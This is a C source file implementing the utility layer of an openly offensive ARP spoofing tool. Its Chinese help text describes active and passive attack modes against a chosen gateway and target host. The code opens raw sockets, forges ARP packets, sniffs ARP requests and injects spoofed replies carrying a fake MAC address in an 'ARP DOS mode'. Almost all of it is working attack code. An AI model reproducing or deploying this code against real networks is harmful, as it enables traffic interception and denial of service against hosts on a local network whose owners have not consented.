/**
Implimentation of util header
@author zhpeng
@version 10.05.25
*/

/*Parse command line*/

#include "arpz_header.h"

#include <sys/ipc.h>
#include <sys/msg.h>

/*print command line*/
void help () {
	printf("**********ARP协议欺骗工具 Ver.1.3beta*************\n");
	printf("Usage:\n");
	printf("\t-m 攻击模式。0为主动式攻击,1为被动式攻击\n");
	printf("\t-g 要攻击的网关IP地址\n");
	printf("\t-t 要攻击的主机IP地址\n");
	printf("\t-f 保存文件\n");
	printf("\t-d 要绑定的网卡名称\n");
	printf("\n");
}

void ParseCmd (int argc, char *argv[], int *mode, char *gwip, char *tgtip, char *rstfile, char *device) {
    int opt = 0;
    bzero(gwip, 20);
    bzero(tgtip, 20);
    bzero(rstfile, 20);

	if (argc == 1) {
		help();
		exit(-1);
	}
    while ((opt = getopt(argc, argv, "m:g:t:f:d:")) != -1) {
        switch (opt) {
            case 'm' : *mode = (atoi(optarg) == 1) ? atoi(optarg) : 0; break;
            case 'g' : strncpy(gwip, optarg, 20); break;
            case 't' : strncpy(tgtip, optarg, 20); break;
            case 'f' : strncpy(rstfile, optarg, 20); break;
            case 'd' : strncpy(device, optarg, 20); break;
            default : break;
        }
    } 
}

/*******************/
int CreateRawSocket (int protocol) {
    int sockfd;

    if ((sockfd = socket(PF_PACKET, SOCK_RAW, htons(protocol))) == -1) {
        perror("Socket Error");
        exit(-1);
    }
    return sockfd;
}

/****************/
int BindToInterface (int sockfd, char *device, int protocol) {
    struct sockaddr_ll sll;
    struct ifreq ifr;

    bzero(&sll, sizeof(sll));
    bzero(&ifr, sizeof(ifr));

    /*Get index*/
    strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
    if ((ioctl(sockfd, SIOCGIFINDEX, &ifr)) == -1) {
        fprintf(stderr, "Get interface Index Error\n");
        exit(-1);
    }

    /*Bind*/
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(protocol);

    if (bind(sockfd, (struct sockaddr *)&sll, sizeof(sll)) == -1) {
        perror("Bind Error");
        exit(-1);
    }

    return 1;
}

/**/
void CreateEtherHeader (void *pkt, char *dstmac, char *srcmac, int protocol) {
    struct ethernet_header *ethdr;

    ethdr = (struct ethernet_header *)pkt;
    memcpy(ethdr->dst, (void *)ether_aton(dstmac), 6);
    memcpy(ethdr->src, (void *)ether_aton(srcmac), 6);
    ethdr->pro = htons(protocol);

    return;
}

/**/
void CreateARPHeader (void *pkt, char *srcmac, char *srcip, char *dstmac, char *dstip) {
    struct arp_header *arphdr;
    struct in_addr tmpaddr;

    arphdr = (struct arp_header *)((char *)pkt + sizeof(struct ethernet_header));
    
    arphdr->protocol = htons(ETH_P_IP);
	arphdr->hardware = htons(0x0001); /*Ethernet*/
    arphdr->opcode = htons(ARPOP_REQUEST);
    arphdr->prolen = 4;
    arphdr->hdrlen = ETH_ALEN;
    /*copy mac address*/
    memcpy(arphdr->sha, (void *)ether_aton(srcmac), 6);
    memcpy(arphdr->tha, (void *)ether_aton(dstmac), 6);
    
    /*copy ip address*/
    if (inet_aton(srcip, &tmpaddr) == 0) {
        perror("Inet_aton Error");
        exit(-1);
    }
    memcpy(arphdr->spa, &(tmpaddr.s_addr), 4);
    
    if (inet_aton(dstip, &tmpaddr) == 0) {
        perror("Inet_aton Error");
        exit(-1);
    }
    memcpy(arphdr->tpa, &(tmpaddr.s_addr), 4);
}

/**/
int SendPacket (int sockfd, void *pkt, int len) {
    int cnt = 0;

    while (write(sockfd, pkt, len) != -1) {
        printf("Sent %d Packets\n", ++cnt);
        sleep(1);
    }
    return 0;
}

/*IPC*/
#define PATHNAME_FTOK 	"/etc/services"
#define PROJ_ID_FTOK	1
#define PERMISSION		0644

struct message {
	long mtype;
	unsigned char *pkt;
};

int CreateMsgQu (void) {
	int msgq;
	key_t key;

	if ((key = ftok(PATHNAME_FTOK, PROJ_ID_FTOK)) == -1) {
		perror("FTOK");
		exit(-1);
	}

	if ((msgq = msgget(key, PERMISSION | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(-1);
	}

	return msgq;
}

void SendMsg (int msgq, struct message buff) {
	if (msgsnd(msgq, &buff, sizeof(struct message), 0) == -1) {
		perror("msgsnd");
		exit(-1);
	}
}

struct message *ReceiveMsg (int msgq) {
	struct message *buff;

	buff = (struct message *)malloc(sizeof(struct message));
	if (msgrcv(msgq, buff, sizeof(struct message), 0, 0) == -1) {
		perror("msgrcv");
		free(buff);
		buff = NULL;
	}
	return buff;
}

void DestroyMsgQ (int msgq) {
	if (msgctl(msgq, IPC_RMID, NULL) == -1) {
		perror("msgctl");
	}
}

int SendRawPacket (int sockfd, void *buff, int len) {
	int slen;

	if ((slen = write(sockfd, buff, len)) != len) {
		printf("Sent %d bytes\n", slen);
		return 0;
	}
	return 1;
}
/*Advanced ARP DOS Mode*/

void *SnifferThread (void *arg) {
	int raw, len, pkt_len;
	unsigned char pkt_buff[2048], *pkt;
	struct sockaddr_ll sll;
	struct ethernet_header *ethhdr;
	struct arp_header *arphdr;
	struct message buff;
	
	int msgq = *((int *)arg);
	
	//printf("Sniffer %d\n", msgq);
	
	pkt_len = sizeof(sll);

	/*Create Raw Socket*/
	raw = CreateRawSocket(ETH_P_ARP);
	BindToInterface(raw, device, ETH_P_ARP);

	/*Loop until user terminate*/
	while (1) {
		bzero(pkt_buff, 2048);

		if ((len = recvfrom(raw, pkt_buff, 2048, 0, (struct sockaddr *)&sll, (socklen_t *)&pkt_len)) == -1) {
			perror("recvfrom");
			exit(1);
		}else if (len < sizeof(struct ethernet_header) + sizeof(struct arp_header)) {
			printf("Packet is too small\n");
			continue;
		}else {
			/*Packet reveived successfully*/
			ethhdr = (struct ethernet_header *)pkt_buff;
				
			if (ethhdr->pro == htons(ETH_P_ARP)) {	/*is arp packet*/
				arphdr = (struct arp_header *)(pkt_buff + sizeof(struct ethernet_header));

				if (arphdr->opcode == htons(ARPOP_REQUEST)) {/*is requst*/
					struct in_addr tmpaddr;
					////tmpaddr.s_addr = (in_addr_t)arphdr->spa;
					memcpy(&(tmpaddr.s_addr), arphdr->spa, 4);
					printf("Sniffer: ARP REQ from MAC %s IP %s\n", ether_ntoa(arphdr->sha), inet_ntoa(tmpaddr));

					/*Send packet to MSGQ for Injector*/
					pkt = (unsigned char *)malloc(len);
					memcpy(pkt, pkt_buff, len);

					/**/
					buff.mtype = 1;
					buff.pkt = pkt;

					/*Send*/
					SendMsg(msgq, buff);
				}
			}
		}
	}
	close(raw);
}

/*Injection Thread*/
void *InjectionThread (void *arg) {
	int raw;
	struct ethernet_header *ethhdr;
	struct arp_header *arphdr;
	//unsigned char *pkt;
	
	int msgq = *((int *)arg);
	//printf("Injector %d\n", msgq);
	
	struct message *buff;
	unsigned char tmp[6];

	raw = CreateRawSocket(ETH_P_ALL);
	BindToInterface(raw, device, ETH_P_ALL);

	while (1) {
		buff = ReceiveMsg (msgq);

		if (buff) {	/*Get msg*/
			ethhdr = (struct ethernet_header *)(buff->pkt);
			arphdr = (struct arp_header *)(buff->pkt + sizeof(struct ethernet_header));

			/*CHange Ethernet headers*/

			memcpy(ethhdr->dst, ethhdr->src, 6);

			memcpy(ethhdr->src, (void *)ether_aton(SPOOFED_MAC), 6);

			/*Change ARP Headers*/

			arphdr->opcode = htons(ARPOP_REPLY);

			memcpy(tmp, arphdr->sha, 6);
			memcpy(arphdr->sha, (void *)ether_aton(SPOOFED_MAC), 6);
			memcpy(arphdr->tha, tmp, 6);

			memcpy(tmp, arphdr->spa, 4);
			memcpy(arphdr->spa, arphdr->tpa, 4);
			memcpy(arphdr->tpa, tmp, 4);

			/*Injection*/
			if (SendRawPacket(raw, buff->pkt, sizeof(struct ethernet_header) + sizeof(struct arp_header))) {
				printf(" Injection Successfully\n");
			}else {
				printf(" Injection Error\n");
			}
			
			free(buff->pkt);
			free(buff);
		}
	}
	close(raw);
}
